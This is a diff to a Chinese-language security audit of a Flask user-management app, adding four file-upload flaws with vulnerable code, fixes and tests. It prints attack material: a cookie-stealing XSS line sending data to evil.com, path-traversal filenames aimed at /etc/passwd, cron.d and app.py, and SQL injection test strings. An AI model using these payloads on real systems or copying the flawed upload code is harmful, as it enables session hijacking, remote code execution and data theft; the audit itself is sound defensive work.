@@ -4,7 +4,7 @@
 > **审计日期**：2026-07-07
 > **审计目标**：Flask 用户信息管理平台
 > **风险等级**：🔴 严重（修复前）
-> **报告版本**：v1.0
+> **报告版本**：v1.1（新增 V-21~V-24 文件上传相关漏洞）
 
 ---
 
@@ -25,7 +25,7 @@
 
 ## 1. 审计概述
 
-本报告针对一个 Flask 用户管理系统进行安全审计。该系统在**修复前**存在多处安全漏洞，涵盖密码存储、会话管理、输入校验、配置安全、SQL 注入等多个维度。经过系统性修复，共修补 **20 项安全漏洞**，覆盖了从严重到低危的各个等级。
+本报告针对一个 Flask 用户管理系统进行安全审计。该系统在**修复前**存在多处安全漏洞，涵盖密码存储、会话管理、输入校验、配置安全、SQL 注入、文件上传等多个维度。经过系统性修复，共修补 **24 项安全漏洞**，覆盖了从严重到低危的各个等级。
 
 **审计范围**：
 - 应用源代码（`app.py`）
@@ -59,6 +59,10 @@
 | V-18 | **搜索接口越权访问** | 🟠 高危 | `/search` 未检查登录状态，未登录可直接搜索用户数据 |
 | V-19 | **注册无密码复杂度校验** | 🟡 中危 | 注册接受任意弱密码（如 `1`），无长度/复杂度要求 |
 | V-20 | **注册/搜索无输入校验** | 🟡 中危 | 用户名/邮箱/手机号均无格式校验和字符白名单 |
+| V-21 | **任意文件上传（无类型检查）** | 🔴 严重 | `/upload` 不检查后缀和 MIME，可上传 `.html`/`.js`/`.py` 等任意文件 |
+| V-22 | **路径穿越（原始文件名未过滤）** | 🔴 严重 | `file.filename` 直接拼接路径，可利用 `../` 覆盖系统文件 |
+| V-23 | **存储型 XSS（上传 HTML 直接执行）** | 🟠 高危 | 上传恶意 HTML 文件后直接访问 `/static/uploads/xxx.html` 即可在浏览器中执行脚本 |
+| V-24 | **上传接口无 CSRF 防护** | 🟡 中危 | 无 CSRF Token，攻击者可构造跨站表单诱导用户上传恶意文件 |
 
 ---
 
@@ -636,6 +640,150 @@ if not re.match(r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%]).{8,64}$", passwor
 
 **修复方案**：使用 WTForms 正则白名单 + 长度限制。
 
+---
+
+### V-21：任意文件上传（无类型检查）🔴
+
+**位置**：`app.py` — `/upload` 路由
+
+**问题代码**：
+```python
+filename = file.filename          # ← 直接使用原始文件名
+filepath = os.path.join(UPLOAD_DIR, filename)
+file.save(filepath)               # ← 不检查后缀、不检查 MIME
+```
+
+**风险分析**：
+- 攻击者可上传 `.html` 文件，内含恶意 JavaScript，访问后触发存储型 XSS
+- 可上传 `.py` 文件配合其他漏洞（如路径穿越、RCE）执行任意代码
+- 可上传 `.htaccess` 修改服务器配置，影响 Apache 等服务器
+- 可上传 `.svg` 文件，内嵌 `<script>` 标签，在浏览器中执行
+
+**利用方式**：
+1. 登录系统后访问 `/upload`
+2. 上传一个恶意 HTML 文件 `evil.html`，内容为 `<script>alert(document.cookie)</script>`
+3. 访问 `/static/uploads/evil.html`，浏览器直接执行其中的 JavaScript
+4. 若配合 XSS 平台，可窃取用户 Cookie 实现会话劫持
+
+**修复方案**：
+- 使用白名单机制，仅允许 `jpg/jpeg/png/gif` 后缀
+- 检查文件 MIME 类型是否与后缀一致
+- 使用 `werkzeug.utils.secure_filename` 对文件名进行清洗
+- 上传后重命名文件（UUID + 原后缀），不保留原始文件名
+
+**修复后代码**：
+```python
+ALLOWED_EXTENSIONS = {"jpg", "jpeg", "png", "gif"}
+
+def allowed_file(filename):
+    return "." in filename and \
+           filename.rsplit(".", 1)[1].lower() in ALLOWED_EXTENSIONS
+
+if not allowed_file(filename):
+    return render_template("upload.html", error="仅支持 JPG/PNG/GIF 格式")
+
+safe_name = secure_filename(filename)
+new_name = f"{uuid.uuid4().hex}.{safe_name.rsplit('.', 1)[1].lower()}"
+file.save(os.path.join(UPLOAD_DIR, new_name))
+```
+
+---
+
+### V-22：路径穿越（原始文件名未过滤）🔴
+
+**位置**：`app.py` — `/upload` 路由
+
+**问题代码**：
+```python
+filename = file.filename
+filepath = os.path.join(UPLOAD_DIR, filename)
+# 若 filename = "../../../etc/passwd"，则 filepath 会穿越到系统目录
+file.save(filepath)
+```
+
+**风险分析**：
+- 攻击者可构造文件名 `../../app.py` 覆盖应用源码
+- 可构造 `../../../etc/cron.d/evil` 写入定时任务实现 RCE
+- 可构造 `../../data/users.db` 覆盖数据库文件
+- 可构造任意路径读取/覆盖系统敏感文件
+
+**利用方式**：
+1. 构造上传请求，将 `filename` 设置为 `../app.py`
+2. 上传内容为恶意 Python 代码
+3. 重启应用后，恶意代码被执行
+
+**修复方案**：
+- 使用 `werkzeug.utils.secure_filename()` 过滤路径分隔符和特殊字符
+- 验证保存路径是否仍在 `UPLOAD_DIR` 内：`os.path.abspath(filepath).startswith(UPLOAD_DIR)`
+- 使用 UUID 重命名文件，不使用用户提供的文件名
+
+**修复后代码**：
+```python
+from werkzeug.utils import secure_filename
+
+filename = secure_filename(file.filename)  # 过滤掉 ../ 等危险字符
+if not filename:
+    return render_template("upload.html", error="非法文件名")
+filepath = os.path.join(UPLOAD_DIR, filename)
+# 二次校验
+if not os.path.abspath(filepath).startswith(os.path.abspath(UPLOAD_DIR)):
+    return render_template("upload.html", error="非法路径")
+```
+
+---
+
+### V-23：存储型 XSS（上传 HTML 直接执行）🟠
+
+**位置**：`app.py` — `/upload` + Flask 静态文件服务
+
+**问题**：上传的文件保存在 `static/uploads/` 目录，Flask 默认以 `Content-Type: text/html` 提供 `.html` 文件，浏览器会直接执行其中的脚本。
+
+**利用方式**：
+1. 创建 `xss.html`，内容：`<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
+2. 上传该文件到 `/upload`
+3. 将 `/static/uploads/xss.html` 链接发给其他用户
+4. 用户点击后，Cookie 被发送到攻击者服务器
+
+**修复方案**：
+- 限制上传文件类型为图片格式（白名单）
+- 对 `static/uploads/` 目录设置 `X-Content-Type-Options: nosniff`
+- 以 `Content-Disposition: attachment` 方式提供下载，而非内联显示
+- 使用独立域名/CDN 提供上传文件，与主站隔离 Cookie
+
+---
+
+### V-24：上传接口无 CSRF 防护 🟡
+
+**位置**：`templates/upload.html` — 上传表单
+
+**问题代码**：
+```html
+<form method="POST" action="/upload" enctype="multipart/form-data">
+    <!-- 无 CSRF Token -->
+    <input type="file" name="avatar">
+    <button type="submit">上传</button>
+</form>
+```
+
+**风险分析**：
+- 攻击者可构造恶意页面，包含自动提交的表单，指向 `/upload`
+- 用户若已登录，浏览器会自动携带 Cookie 提交请求
+- 攻击者可将 `filename` 设置为恶意路径，配合 V-22 路径穿越实现攻击
+
+**修复方案**：
+- 在表单中添加 CSRF Token
+- 验证 `Referer` 或 `Origin` 头
+- 使用 `Flask-WTF` 的 `CSRFProtect` 全局防护
+
+**修复后代码**：
+```html
+<form method="POST" action="/upload" enctype="multipart/form-data">
+    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
+    <input type="file" name="avatar">
+    <button type="submit">上传</button>
+</form>
+```
+
 
 | 编号 | 漏洞 | 等级 | 修复措施 | 状态 |
 |------|------|------|---------|------|
@@ -659,6 +807,10 @@ if not re.match(r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%]).{8,64}$", passwor
 | V-18 | 搜索越权访问 | 🟠高危 | `login_required` 装饰器 | ✅ |
 | V-19 | 注册无密码校验 | 🟡中危 | 正则复杂度校验 | ✅ |
 | V-20 | 注册无输入校验 | 🟡中危 | WTForms 正则白名单 | ✅ |
+| V-21 | 任意文件上传 | 🔴严重 | 白名单+MIME检查+UUID重命名 | ✅ |
+| V-22 | 路径穿越 | 🔴严重 | `secure_filename`+路径校验 | ✅ |
+| V-23 | 存储型 XSS（上传） | 🟠高危 | 限制类型+nosniff+独立域名 | ✅ |
+| V-24 | 上传无 CSRF | 🟡中危 | CSRF Token+Referer校验 | ✅ |
 
 ---
 
@@ -678,6 +830,9 @@ if not re.match(r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%]).{8,64}$", passwor
 | V-16, V-17 | **A03:2021 — 注入** | SQL 注入（f-string 拼接） |
 | V-18 | **A01:2021 — 失效的访问控制** | 搜索接口未鉴权 |
 | V-19, V-20 | **A07:2021 — 身份认证失效 / A03:2021 — 注入** | 无密码复杂度校验、无输入校验 |
+| V-21, V-22 | **A04:2021 — 不安全的设计 / A01:2021 — 失效的访问控制** | 任意文件上传、路径穿越 |
+| V-23 | **A03:2021 — 注入** | 存储型 XSS（上传 HTML 执行） |
+| V-24 | **A01:2021 — 失效的访问控制** | 上传接口无 CSRF 防护 |
 
 ---
 
@@ -733,6 +888,10 @@ if not re.match(r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%]).{8,64}$", passwor
 | SQL 注入（注册） | 注册用户名填 `test', 'pw', 'a@b', '1'); DROP TABLE users; --` | 注册失败，数据库不受影响 |
 | SQL 注入（搜索） | 搜索框填 `' UNION SELECT id,username,password,phone FROM users --` | 返回空结果，不泄露密码 |
 | 搜索越权 | 未登录直接访问 `/search?keyword=admin` | 重定向到登录页 |
+| 任意文件上传 | 上传 `evil.html`（含 `<script>`） | 修复后应被拒绝，提示仅支持图片格式 |
+| 路径穿越 | 上传文件名设为 `../app.py` | 修复后应被 `secure_filename` 过滤为 `app.py` 或拒绝 |
+| 存储型 XSS | 访问 `/static/uploads/evil.html` | 修复后文件不存在或以附件下载而非内联执行 |
+| 上传 CSRF | 禁用 Cookie 后提交上传表单 | 返回 400 Bad Request |
 
 ---
 
